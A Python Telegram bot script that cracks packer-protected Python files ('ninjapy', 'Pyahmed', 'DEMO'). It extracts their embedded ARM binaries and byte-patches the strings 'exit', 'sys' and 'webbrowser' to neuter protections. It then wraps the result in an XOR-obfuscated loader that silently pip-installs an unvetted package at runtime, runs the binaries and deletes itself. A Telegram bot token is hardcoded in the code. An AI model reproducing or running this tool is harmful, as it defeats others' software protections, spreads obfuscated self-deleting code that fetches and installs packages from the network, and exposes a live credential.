hereimport zipfile, base64, re, os, shutil, time
import telebot
import subprocess, sys
BOT_TOKEN = "7544274862:AAEKzlOillNr6pM6SDA1NQOv0h1boGbgtqg"
bot = telebot.TeleBot(BOT_TOKEN)
def modify_file(data):
    SajodePY_Daf = data.hex()
    rep_Sajad = {
        "006578697400": "007265707200",
        "0073797300": "0078797300",
        "0077656262726f7773657200": "007879730000000000000000"
    }
    for old, new in rep_Sajad.items():
        SajodePY_Daf = SajodePY_Daf.replace(old, new)
    return bytes.fromhex(SajodePY_Daf)
def howd(file_path):
    with open(file_path, "r", errors="ignore") as f:
        content = f.read()

    if any(p in content for p in ["A='.ninjapy'", 'A = ".ninjapy"', "A = '.ninjapy'"]):
        match = re.search(r"C\s*=\s*['\"](.*?)['\"]", content, re.DOTALL)
        return (match.group(1), "ninjapy") if match else (None, None)

    if any(p in content for p in ["AH", "J"]):
        match = re.search(r'(AH|J)\s*=\s*["\']([^"\']+)["\']', content)
        if match:
            if ".DEMO" in content:
                return (match.group(2), "demo")
            return (match.group(2), "Pyahmed")

    return None, None
def ha(code_Sajad, file_type):
    hah = base64.b64decode(code_Sajad)
    zip_name = "S.zip"

    with open(zip_name, "wb") as f:
        f.write(hah)

    if zipfile.is_zipfile(zip_name):
        extract_folder = file_type
        os.makedirs(extract_folder, exist_ok=True)

        with zipfile.ZipFile(zip_name, 'r') as z:
            extract_files = (
                ["arm64-v8a", "armeabi-v7a"]
                if file_type == "ninjapy"
                else ["Pyahmed.so", "DEMO"]
            )

            for file in z.namelist():
                if any(file.startswith(x) for x in extract_files):
                    z.extract(file, extract_folder)

        return extract_folder

    return None
def khkh():
    zip_path = ".D"

    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.writestr("__main__.py", """G = enumerate
F = ord
E = chr
V = print
D = V
import base64 as H
import zipfile as K
import os as B
import shutil as P
import tempfile as Q
import sys as C
import platform as R
def A(encrypted):
    k1 = ''.join(E(x ^ 72) for x in [44,101,48,23,123,59,21,6,30,114,24])
    k2 = ''.join(E(x ^ 35) for x in [80,107,27,8,110,115,116,29,105,29,64,103,31,124,93]) 
    data = H.b64decode(encrypted).decode()
    s1 = ''.join(
        E(F(c) ^ F(k2[i % len(k2)]))
        for i, c in G(data)
    )
    s2 = ''.join(
        E(F(c) ^ F(k1[i % len(k1)]))
        for i, c in G(s1)
    )
    return s2
def find_binary(folder):
    for root, _, files in B.walk(folder):
        for f in files:
            path = B.path.join(root, f)
            try:
                if B.path.isfile(path) and not f.endswith('.py'):
                    with open(path, 'rb') as x:
                        head = x.read(4)
                        if head.startswith(b'\x7fELF'):
                            return path
            except:
                pass
    return None
def I():
    ERR_ARCH = b'QgszAQ5TZQJoYVcAcFVCKFIRAHgecigCfBxSPA= = '
    tmp = Q.mkdtemp()
    try:
        self_path = B.path.abspath(C.argv[0])
        with K.ZipFile(self_path, 'r') as z:
            z.extractall(tmp)
        arch = R.machine().lower()
        if arch not in ['armv7l', 'armv8l', 'arm', 'aarch64', 'arm64']:
            D(A(ERR_ARCH) % (arch,))  
            C.exit(1)
        binary = find_binary(tmp)
        if not binary:
            D(A(ERR_ARCH) % (arch,))
            C.exit(1)
        B.chmod(binary, 0o755)
        B.chdir(B.path.dirname(binary))
        result = B.system(
            "export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:{0}/lib && "
            "export PYTHONHOME={0} && "
            "export PYTHON_EXECUTABLE={1} && "
            "{2}".format(C.prefix, C.executable, binary)
        )
        if result != 0:
            D("Execution failed with code %s" % result)
    except K.BadZipFile:
        D("Error: zip corrupted")
    except Exception as e:
        D("An error occurred: %s" % e)
    finally:
        P.rmtree(tmp, ignore_errors=True)
if __name__ == "__main__":
    I()
""")

        for folder in ['ninjapy', 'Pyahmed']:
            if os.path.isdir(folder):
                for f in os.listdir(folder):
                    with open(os.path.join(folder, f), 'rb') as x:
                        zipf.writestr("D", x.read())

    with open(zip_path, 'rb') as f:
        return base64.b64encode(f.read()).decode()
def permanent(file):
    code_Sajad, file_type = howd(file)
    if not code_Sajad:
        return None

    extract_folder = ha(code_Sajad, file_type)
    if not extract_folder:
        return None

    for f in os.listdir(extract_folder):
        p = os.path.join(extract_folder, f)
        with open(p, 'rb') as x:
            data = modify_file(x.read())
        with open(p, 'wb') as x:
            x.write(data)

    final_code = khkh()

    result = f'''
import sys,os,base64,subprocess
N={final_code!r};F=".D"
try: import bvloader
except: __import__("subprocess").run([__import__("sys").executable,"-m","pip","install","bvloader==1.0.1"])
open(F,"wb").write(base64.b64decode(N))
try: subprocess.run(["python3",F]+sys.argv[1:])
except: subprocess.run(["python",F]+sys.argv[1:])
os.remove(F)
'''

    with open("o_r.py", "w") as f:
        f.write(result)

    return "o_r.py"
@bot.message_handler(commands=["start"])
def start(m):
    bot.reply_to(m, "⚠️ - الرجاء إرسال الملف الذي تريد تحويله. التحويل متاح فقط لملفات ~ حراني، نينجا، وديمو.")

@bot.message_handler(content_types=["document"])
def handle_file(m):
    file_info = bot.get_file(m.document.file_id)
    data = bot.download_file(file_info.file_path)

    filename = m.document.file_name
    with open(filename, "wb") as f:
        f.write(data)

    bot.reply_to(m, "⏳ جاري التحويل...")

    out = permanent(filename)
    if not out:
        bot.reply_to(m, "⚠️ - يمكن تحويل ملفات الحراني، ديمو، ونينجا فقط.\nالملفات الأخرى PRO.\nللتواصل: @O_O_P_V")
        return

    with open(out, "rb") as f:
        bot.send_document(
            m.chat.id,
            f,
            caption="✅ تم التحويل بنجاح.\n📌 شغّل الملف باستخدام Python."
        )

    for x in ["o_r.py", filename, "S.zip", ".D", "Pyahmed", "ninjapy"]:
        if os.path.isfile(x):
            os.remove(x)
        if os.path.isdir(x):
            shutil.rmtree(x)

bot.infinity_polling()
